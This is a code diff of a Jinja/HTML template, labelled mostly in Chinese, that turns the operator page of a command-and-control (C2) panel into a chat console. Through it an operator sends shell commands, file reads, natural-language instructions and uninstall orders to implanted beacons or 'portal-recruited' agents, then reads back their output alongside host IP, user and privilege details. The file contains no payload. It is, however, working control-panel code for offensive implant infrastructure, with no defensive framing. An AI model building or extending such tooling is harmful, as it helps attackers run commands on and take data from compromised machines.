@@ -2,153 +2,312 @@
 {% from 'admin/_macros.html' import page_header, metric_card, section_header, empty_state, badge %}
 {% block content %}
 <style>
-/* mono readouts for machine data */
 .c2-mono { font-family:"Fira Code", ui-monospace, monospace; font-variant-numeric:tabular-nums; }
-/* auto-refresh toggle: hover affordance */
-#auto-refresh-indicator { transition:color 160ms ease, border-color 160ms ease; }
-#auto-refresh-indicator:hover { color:#67e8f9; border-color:rgba(34, 211, 238, 0.45); }
+
+/* ===== chat console layout ===== */
+.chat-layout { display:grid; grid-template-columns:minmax(0,1fr) 320px; gap:14px; margin-top:14px; align-items:start; }
+@media (max-width:1180px) { .chat-layout { grid-template-columns:1fr; } }
+
+.chat-panel { display:flex; flex-direction:column; padding:0; overflow:hidden; }
+
+/* presence bar */
+.chat-presence { display:flex; align-items:center; gap:10px; padding:12px 16px; border-bottom:1px solid var(--border); flex-wrap:wrap; }
+.presence-dot { width:8px; height:8px; border-radius:50%; background:var(--muted-foreground); flex-shrink:0; transition:background 200ms ease, box-shadow 200ms ease; }
+.presence-dot.online { background:var(--success); box-shadow:0 0 8px rgba(52,211,153,.5); }
+.presence-dot.offline { background:var(--danger); }
+.presence-meta { font-size:11.5px; color:var(--muted-foreground); }
+
+/* transcript */
+.chat-log { min-height:320px; max-height:56vh; overflow-y:auto; padding:16px; display:flex; flex-direction:column; gap:14px; scroll-behavior:smooth; }
+.chat-exchange { display:flex; flex-direction:column; gap:6px; }
+.chat-row { display:flex; justify-content:flex-end; }
+.chat-row.agent { justify-content:flex-start; }
+.bubble { max-width:78%; border-radius:12px; padding:10px 14px; font-size:13px; line-height:1.6; border:1px solid var(--border); background:var(--card); transition:border-color 200ms ease; }
+.bubble.op { border-color:rgba(59,130,246,.35); background:linear-gradient(180deg, rgba(30,58,138,.18), rgba(13,20,36,.9)); }
+.bubble .bubble-head { display:flex; align-items:center; gap:8px; margin-bottom:6px; font-size:10.5px; color:var(--muted-foreground); flex-wrap:wrap; }
+.bubble .bubble-body { white-space:pre-wrap; word-break:break-word; }
+.bubble.op .bubble-body { font-family:"Fira Code", ui-monospace, monospace; font-size:12px; }
+.bubble .bubble-out { margin-top:8px; font-family:"Fira Code", ui-monospace, monospace; font-size:11.5px; white-space:pre-wrap; word-break:break-word; max-height:260px; overflow-y:auto; background:rgba(2,6,23,.55); border:1px solid var(--border); border-radius:8px; padding:8px 10px; }
+.bubble .pending { display:inline-flex; align-items:center; gap:8px; font-size:11.5px; color:var(--muted-foreground); }
+.pending-dots::after { content:""; animation:dots 1.2s steps(4,end) infinite; }
+@keyframes dots { 0%{content:""} 25%{content:"·"} 50%{content:"··"} 75%{content:"···"} }
+.st-badge { font-size:10px; padding:1px 8px; border-radius:99px; border:1px solid var(--border); letter-spacing:.05em; }
+.st-queued { color:var(--info); border-color:rgba(96,165,250,.4); }
+.st-dispatched { color:var(--warning); border-color:rgba(245,158,11,.4); }
+.st-completed { color:var(--success); border-color:rgba(52,211,153,.4); }
+.st-failed { color:var(--danger); border-color:rgba(251,113,133,.4); }
+
+/* presets + composer */
+.chat-presets { display:flex; gap:8px; flex-wrap:wrap; padding:10px 16px; border-top:1px solid var(--border); }
+.preset-chip { cursor:pointer; font-size:11px; padding:5px 12px; border-radius:99px; border:1px solid var(--border); color:var(--foreground); background:var(--secondary); transition:color 160ms ease, border-color 160ms ease, box-shadow 160ms ease; user-select:none; }
+.preset-chip:hover { color:#67e8f9; border-color:rgba(34,211,238,.45); box-shadow:0 0 12px rgba(34,211,238,.12); }
+.preset-chip.nl { border-color:rgba(52,211,153,.3); }
+.preset-chip.nl:hover { color:#6ee7b7; border-color:rgba(52,211,153,.5); }
+.preset-group { font-size:10px; color:var(--muted-foreground); align-self:center; letter-spacing:.12em; margin-right:2px; }
+
+.chat-composer { display:flex; gap:10px; align-items:flex-end; padding:12px 16px 14px; border-top:1px solid var(--border); }
+.chat-composer select { width:auto; min-width:110px; }
+.chat-composer textarea { flex:1; min-height:52px; max-height:160px; resize:vertical; font-family:"Fira Code", ui-monospace, monospace; font-size:12.5px; }
+.composer-hint { width:100%; padding:0 16px 8px; font-size:10.5px; color:var(--muted-foreground); }
+#btn-send { white-space:nowrap; }
+
+/* sidebar */
+.side-card { padding:14px; }
+.side-kv { display:flex; justify-content:space-between; gap:10px; padding:5px 0; font-size:12px; border-bottom:1px dashed var(--border); }
+.side-kv:last-child { border-bottom:none; }
+.side-kv .k { color:var(--muted-foreground); flex-shrink:0; }
+.side-kv .v { text-align:right; word-break:break-all; }
+#auto-refresh-indicator { transition:color 160ms ease, border-color 160ms ease; cursor:pointer; }
+#auto-refresh-indicator:hover { color:#67e8f9; border-color:rgba(34,211,238,.45); }
 </style>
-{{ page_header('C2', 'Agent 控制台', agent.hostname or agent.agent_id[:16], [agent.status|status_zh, agent.privileges or 'user']) }}
 
-<div class="cards">
-  {{ metric_card('IP', '<span class="c2-mono">' ~ agent.source_ip ~ '</span>') }}
-  {{ metric_card('主机名', agent.hostname or '-') }}
-  {{ metric_card('系统', agent.os_name ~ ' ' ~ agent.os_version if agent.os_name else '-') }}
-  {{ metric_card('用户', agent.username or '-', 'default', agent.privileges) }}
-  {{ metric_card('最后心跳', '<span class="c2-mono">' ~ agent.last_seen_at.strftime('%H:%M:%S') ~ '</span>') }}
-  {{ metric_card('任务数', task_count) }}
-</div>
+{{ page_header('C2', 'Agent 对话式控制台', (agent.hostname or agent.agent_id[:16]), [
+  agent.status|status_zh,
+  'Portal 招募' if is_recruited else '植入 Beacon',
+  agent.privileges or 'user'
+]) }}
 
-<div class="grid-2" style="margin-top:14px">
-  <section class="panel">
-    {{ section_header('快速指令模板', '一键下发常用侦查命令') }}
-    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px">
+<div class="chat-layout">
+  <section class="panel chat-panel">
+    <div class="chat-presence">
+      <span class="presence-dot {{ 'online' if agent.status == 'active' else 'offline' }}" id="presence-dot"></span>
+      <code class="c2-mono" style="font-size:12px">{{ agent.agent_id[:20] }}…</code>
+      {% if is_recruited %}{{ badge('Portal 招募', 'success') }}{% else %}{{ badge('植入 Beacon', 'info') }}{% endif %}
+      <span class="presence-meta" id="presence-meta">
+        心跳间隔 <span class="c2-mono">{{ agent.poll_interval }}s</span> ·
+        最后心跳 <span class="c2-mono" id="last-seen">{{ agent.last_seen_at.strftime('%m-%d %H:%M:%S') }}</span>
+      </span>
+      <span class="chip" id="auto-refresh-indicator" style="margin-left:auto">自动刷新: 开 (4s)</span>
+    </div>
+
+    <div class="chat-log" id="chat-log">
+      {% if not tasks %}
+      <div class="chat-exchange">
+        <div class="chat-row agent"><div class="bubble">
+          <div class="bubble-head"><span>SYSTEM</span></div>
+          <div class="bubble-body">会话已建立。下发的指令将进入队列，{{ '招募 Agent 会在下一次心跳（≤' ~ agent.poll_interval ~ 's）领取执行' if is_recruited else 'Beacon 会在下一次轮询（≤' ~ agent.poll_interval ~ 's）领取执行' }}，回传结果会实时出现在此处。</div>
+        </div></div>
+      </div>
+      {% endif %}
+    </div>
+
+    <div class="chat-presets" id="chat-presets">
+      {% if is_recruited %}
+      <span class="preset-group">NL 预设</span>
+      {% for t in nl_templates %}
+      <span class="preset-chip nl" data-command="{{ t.command }}" data-type="{{ t.task_type }}">{{ t.label }}</span>
+      {% endfor %}
+      <span class="preset-group" style="margin-left:8px">SHELL</span>
+      {% endif %}
       {% for t in templates %}
-      <form method="post" action="/admin/c2/send-template" style="display:inline">
-        <input type="hidden" name="agent_id" value="{{ agent.agent_id }}" />
-        <input type="hidden" name="template_id" value="{{ t.id }}" />
-        <button type="submit" style="width:100%;font-size:11px;padding:10px 8px;text-align:left;display:flex;align-items:center;gap:6px;white-space:nowrap">
-          <span style="font-size:16px;flex-shrink:0">{{ t.icon }}</span>
-          <span>{{ t.label }}</span>
-        </button>
-      </form>
+      {% if t.task_type != 'uninstall' %}
+      <span class="preset-chip" data-command="{{ t.command }}" data-type="{{ t.task_type }}">{{ t.label }}</span>
+      {% endif %}
       {% endfor %}
     </div>
+
+    <div class="composer-hint" id="composer-hint">Enter 发送 · Shift+Enter 换行 · 预设点击填入输入框，可改后再发</div>
+    <div class="chat-composer">
+      <select id="task-type" style="width:auto">
+        {% if is_recruited %}<option value="nl_instruct" selected>对话指令 (nl)</option>{% endif %}
+        <option value="cmd" {{ '' if is_recruited else 'selected' }}>Shell 命令 (cmd)</option>
+        <option value="read_file">读文件 (read_file)</option>
+        <option value="uninstall">卸载 Agent</option>
+      </select>
+      <textarea id="chat-input" placeholder="{{ '用自然语言向该 Agent 下达指令，例如：报告当前目录内容与运行身份…' if is_recruited else '输入要下发的 shell 命令，例如：whoami; uname -a' }}"></textarea>
+      <button type="button" class="primary" id="btn-send">发送指令</button>
+    </div>
   </section>
 
-  <section class="panel">
-    {{ section_header('自定义命令', '自由输入命令或文件路径') }}
-    <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/cmd" class="stack">
-      <select name="task_type" style="width:auto">
-        <option value="cmd">执行命令 (cmd)</option>
-        <option value="read_file">读取文件 (read_file)</option>
-        <option value="write_file">写入文件 (write_file)</option>
-        <option value="download">下载文件 (download)</option>
-        <option value="uninstall">卸载 Agent (uninstall)</option>
-      </select>
-      <input type="text" name="file_path" placeholder="文件路径 (读写文件时使用)" />
-      <textarea name="command" placeholder="命令或内容..." style="min-height:60px;font-family:inherit;font-size:13px"></textarea>
-      <button type="submit">发送命令</button>
-    </form>
-  </section>
+  <aside style="display:flex;flex-direction:column;gap:14px">
+    <section class="panel">
+      {{ section_header('端点信息', '') }}
+      <div class="side-card">
+        <div class="side-kv"><span class="k">来源 IP</span><span class="v c2-mono">{{ agent.source_ip }}</span></div>
+        <div class="side-kv"><span class="k">主机名</span><span class="v">{{ agent.hostname or '-' }}</span></div>
+        <div class="side-kv"><span class="k">系统</span><span class="v">{{ (agent.os_name ~ ' ' ~ (agent.os_version or '')) if agent.os_name else '-' }}</span></div>
+        <div class="side-kv"><span class="k">用户 / 权限</span><span class="v">{{ agent.username or '-' }} · {{ agent.privileges or 'user' }}</span></div>
+        <div class="side-kv"><span class="k">架构</span><span class="v">{{ agent.arch or '-' }}</span></div>
+        <div class="side-kv"><span class="k">植入类型</span><span class="v">{{ agent.payload_type or 'implant' }}</span></div>
+        {% if recruit_src %}<div class="side-kv"><span class="k">招募令牌</span><span class="v c2-mono" title="{{ recruit_src }}">{{ recruit_src[:14] }}…</span></div>{% endif %}
+        <div class="side-kv"><span class="k">首次上线</span><span class="v c2-mono">{{ agent.first_seen_at.strftime('%m-%d %H:%M') }}</span></div>
+        <div class="side-kv"><span class="k">任务总数</span><span class="v c2-mono">{{ task_count }}</span></div>
+      </div>
+    </section>
+
+    {% if type_stats %}
+    <section class="panel">
+      {{ section_header('任务类型分布', '') }}
+      <div class="side-card">
+        {% for t, n in type_stats.items() %}
+        <div class="side-kv"><span class="k">{{ t }}</span><span class="v c2-mono">{{ n }}</span></div>
+        {% endfor %}
+      </div>
+    </section>
+    {% endif %}
+
+    <section class="panel">
+      {{ section_header('危险操作', '') }}
+      <div class="side-card">
+        <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/delete" onsubmit="return confirm('确认删除该 Agent 及所有任务？不可撤销。')">
+          <button class="danger" type="submit" style="width:100%">删除 Agent</button>
+        </form>
+      </div>
+    </section>
+  </aside>
 </div>
 
-<section class="panel" style="margin-top:14px">
-  {{ section_header('Agent 信息', 'Agent ID: ' ~ agent.agent_id) }}
-  <div class="grid-4">
-    <div class="card" style="padding:12px"><div class="muted">架构</div><div style="font-weight:650;margin-top:4px">{{ agent.arch or '-' }}</div></div>
-    <div class="card" style="padding:12px"><div class="muted">植入类型</div><div style="font-weight:650;margin-top:4px">{{ agent.payload_type or 'implant' }}</div></div>
-    <div class="card" style="padding:12px"><div class="muted">轮询间隔</div><div class="c2-mono" style="font-weight:650;margin-top:4px">{{ agent.poll_interval }}s</div></div>
-    <div class="card" style="padding:12px"><div class="muted">首次上线</div><div class="c2-mono" style="font-weight:650;margin-top:4px">{{ agent.first_seen_at.strftime('%m-%d %H:%M') }}</div></div>
-  </div>
-  <div style="margin-top:12px">
-    <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/delete" onsubmit="return confirm('确认删除该 Agent 及所有任务？不可撤销。')" style="display:inline">
-      <button class="secondary" type="submit">删除 Agent</button>
-    </form>
-  </div>
-</section>
-
-<section class="panel" style="margin-top:14px" id="tasks-section">
-  <div class="panel-header">
-    <div>
-      <h3 class="panel-title">任务历史</h3>
-      <div class="panel-subtitle">最近 100 条 — <span id="task-count">{{ tasks|length }}</span> 条记录 | <a href="?">刷新页面</a></div>
-    </div>
-    <div class="toolbar">
-      <span class="chip" id="auto-refresh-indicator" style="cursor:pointer" onclick="toggleAutoRefresh()">自动刷新: 关</span>
-    </div>
-  </div>
-  <div class="table-wrap">
-    <table>
-      <thead>
-        <tr><th>ID</th><th>类型</th><th>命令</th><th>状态</th><th>输出</th><th>创建</th><th>完成</th></tr>
-      </thead>
-      <tbody id="tasks-body">
-        {% for task in tasks %}
-        <tr>
-          <td><code>{{ task.id }}</code></td>
-          <td>
-            {% if task.task_type == 'cmd' %}{{ badge('cmd', 'info') }}
-            {% elif task.task_type == 'read_file' %}{{ badge('读', 'warning') }}
-            {% elif task.task_type == 'write_file' %}{{ badge('写', 'danger') }}
-            {% elif task.task_type == 'download' %}{{ badge('下载', 'info') }}
-            {% elif task.task_type == 'uninstall' %}{{ badge('卸载', 'danger') }}
-            {% else %}{{ badge(task.task_type, 'success') }}{% endif %}
-          </td>
-          <td><code style="font-size:11px">{{ (task.command or '')[:50] }}{% if (task.command or '')|length > 50 %}...{% endif %}</code></td>
-          <td>
-            {% if task.status == 'completed' %}{{ badge('完成', 'success') }}
-            {% elif task.status == 'failed' %}{{ badge('失败', 'danger') }}
-            {% elif task.status == 'dispatched' %}{{ badge('派发', 'warning') }}
-            {% elif task.status == 'queued' %}{{ badge('排队', 'info') }}
-            {% else %}{{ badge(task.status|status_zh, 'info') }}{% endif %}
-          </td>
-          <td>
-            {% if task.output %}
-              <details><summary style="cursor:pointer;font-size:11px;color:var(--theme-accent)">查看 ({{ task.output|length }} 字符)</summary>
-                <pre style="max-height:200px;max-width:500px;overflow:auto;font-size:11px;margin-top:4px">{{ task.output }}</pre>
-              </details>
-            {% else %}<span class="muted">-</span>{% endif %}
-          </td>
-          <td class="c2-mono" style="font-size:11px">{{ task.created_at.strftime('%m-%d %H:%M') }}</td>
-          <td class="c2-mono" style="font-size:11px">{{ task.completed_at.strftime('%m-%d %H:%M') if task.completed_at else '-' }}</td>
-        </tr>
-        {% endfor %}
-        {% if not tasks %}
-        {{ empty_state('暂无任务', '通过快速模板或自定义命令下发指令。', 7, 'C2') }}
-        {% endif %}
-      </tbody>
-    </table>
-  </div>
-</section>
-
 <script>
-var AUTO_REFRESH = false;
-var REFRESH_INTERVAL = 5000;
-var timer = null;
-var lastTaskId = {{ (tasks|first).id if tasks else 0 }};
+(function () {
+  var AGENT_ID = '{{ agent.agent_id }}';
+  var log = document.getElementById('chat-log');
+  var input = document.getElementById('chat-input');
+  var typeSel = document.getElementById('task-type');
+  var btnSend = document.getElementById('btn-send');
+  var seen = {};        // task id -> {status, outLen}
+  var AUTO_REFRESH = true;
+  var timer = null;
 
-function toggleAutoRefresh() {
-  AUTO_REFRESH = !AUTO_REFRESH;
-  var indicator = document.getElementById('auto-refresh-indicator');
-  if (AUTO_REFRESH) {
-    indicator.textContent = '自动刷新: 开 (5s)';
-    indicator.style.color = 'var(--theme-accent)';
-    timer = setInterval(checkNewTasks, REFRESH_INTERVAL);
-  } else {
-    indicator.textContent = '自动刷新: 关';
-    indicator.style.color = '';
-    if (timer) clearInterval(timer);
+  var STATUS_LABEL = { queued: '排队', dispatched: '已派发', completed: '完成', failed: '失败' };
+  var TYPE_LABEL = { nl_instruct: '指令', cmd: 'cmd', read_file: '读文件', write_file: '写文件', download: '下载', uninstall: '卸载' };
+
+  function fmtTime(iso) {
+    if (!iso) return '';
+    var d = new Date(iso);
+    function p(n) { return n < 10 ? '0' + n : '' + n; }
+    return (d.getMonth() + 1) + '-' + p(d.getDate()) + ' ' + p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
   }
-}
 
-function checkNewTasks() {
-  var url = '/api/admin/c2/tasks?agent_id={{ agent.agent_id }}&since_id=' + lastTaskId;
-  fetch(url).then(function(r) { return r.json(); }).then(function(data) {
-    if (data.tasks && data.tasks.length > 0) {
-      location.reload();
+  function esc(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
+      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+    });
+  }
+
+  function renderExchange(t) {
+    var wrap = document.createElement('div');
+    wrap.className = 'chat-exchange';
+    wrap.dataset.taskId = t.id;
+
+    var outHtml = '';
+    if (t.output) {
+      outHtml = '<div class="bubble-out">' + esc(t.output) + '</div>';
+    } else if (t.status === 'completed') {
+      outHtml = '<div class="bubble-out">(无输出)</div>';
+    } else if (t.status === 'failed') {
+      outHtml = '<div class="bubble-out" style="color:var(--danger)">(执行失败)</div>';
+    } else {
+      outHtml = '<div class="pending"><span class="pending-dots"></span><span>等待 Agent 回传</span></div>';
     }
-  }).catch(function(){});
-}
+
+    wrap.innerHTML =
+      '<div class="chat-row op"><div class="bubble op">' +
+        '<div class="bubble-head"><span>#' + t.id + '</span><span class="st-badge st-' + t.status + '">' + (STATUS_LABEL[t.status] || t.status) + '</span><span>' + esc(TYPE_LABEL[t.task_type] || t.task_type) + '</span><span>' + fmtTime(t.created_at) + '</span></div>' +
+        '<div class="bubble-body">' + esc(t.command) + '</div>' +
+      '</div></div>' +
+      '<div class="chat-row agent"><div class="bubble">' +
+        '<div class="bubble-head"><span>AGENT</span><span>' + fmtTime(t.completed_at) + '</span></div>' +
+        '<div class="reply-slot">' + outHtml + '</div>' +
+      '</div></div>';
+    return wrap;
+  }
+
+  function applyTasks(tasks) {
+    var scroll = false;
+    tasks.forEach(function (t) {
+      var prev = seen[t.id];
+      var outLen = (t.output || '').length;
+      if (!prev) {
+        log.appendChild(renderExchange(t));
+        seen[t.id] = { status: t.status, outLen: outLen };
+        scroll = true;
+      } else if (prev.status !== t.status || prev.outLen !== outLen) {
+        var el = log.querySelector('.chat-exchange[data-task-id="' + t.id + '"]');
+        if (el) log.replaceChild(renderExchange(t), el);
+        seen[t.id] = { status: t.status, outLen: outLen };
+        scroll = true;
+      }
+    });
+    if (scroll) log.scrollTop = log.scrollHeight;
+    // drop the bootstrap hint once real history exists
+    if (tasks.length > 0) {
+      var hint = log.querySelector('.chat-exchange:not([data-task-id])');
+      if (hint) hint.remove();
+    }
+  }
+
+  function poll() {
+    fetch('/api/admin/c2/agents/' + AGENT_ID + '/chat')
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.agent) {
+          var dot = document.getElementById('presence-dot');
+          dot.className = 'presence-dot ' + (data.agent.status === 'active' ? 'online' : 'offline');
+          var seenEl = document.getElementById('last-seen');
+          if (seenEl && data.agent.last_seen_at) {
+            var d = new Date(data.agent.last_seen_at);
+            function p(n) { return n < 10 ? '0' + n : '' + n; }
+            seenEl.textContent = (d.getMonth() + 1) + '-' + p(d.getDate()) + ' ' + p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+          }
+        }
+        if (data.tasks) applyTasks(data.tasks);
+      }).catch(function () {});
+  }
+
+  function send() {
+    var msg = input.value.trim();
+    if (!msg) { input.focus(); return; }
+    btnSend.disabled = true;
+    fetch('/api/admin/c2/agents/' + AGENT_ID + '/chat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: msg, task_type: typeSel.value })
+    }).then(function (r) { return r.json().then(function (d) { return { ok: r.ok, d: d }; }); })
+      .then(function (res) {
+        btnSend.disabled = false;
+        if (res.ok && res.d.task) {
+          input.value = '';
+          applyTasks([res.d.task]);
+        } else {
+          alert(res.d && res.d.error ? '发送失败: ' + res.d.error : '发送失败');
+        }
+        input.focus();
+      }).catch(function () { btnSend.disabled = false; });
+  }
+
+  btnSend.addEventListener('click', send);
+  input.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
+  });
+
+  document.querySelectorAll('.preset-chip').forEach(function (chip) {
+    chip.addEventListener('click', function () {
+      input.value = chip.dataset.command || '';
+      if (chip.dataset.type) {
+        var opt = typeSel.querySelector('option[value="' + chip.dataset.type + '"]');
+        if (opt) typeSel.value = chip.dataset.type;
+      }
+      input.focus();
+    });
+  });
+
+  var indicator = document.getElementById('auto-refresh-indicator');
+  function setTimer(on) {
+    if (timer) { clearInterval(timer); timer = null; }
+    if (on) timer = setInterval(poll, 4000);
+  }
+  indicator.addEventListener('click', function () {
+    AUTO_REFRESH = !AUTO_REFRESH;
+    indicator.textContent = AUTO_REFRESH ? '自动刷新: 开 (4s)' : '自动刷新: 关';
+    indicator.style.color = AUTO_REFRESH ? 'var(--theme-accent)' : '';
+    setTimer(AUTO_REFRESH);
+  });
+
+  // bootstrap with server-rendered history, oldest first
+  var initialData = {{ initial_tasks_json }};
+  if (initialData && initialData.length) applyTasks(initialData);
+  setTimer(true);
+  poll();
+})();
 </script>
 {% endblock %}
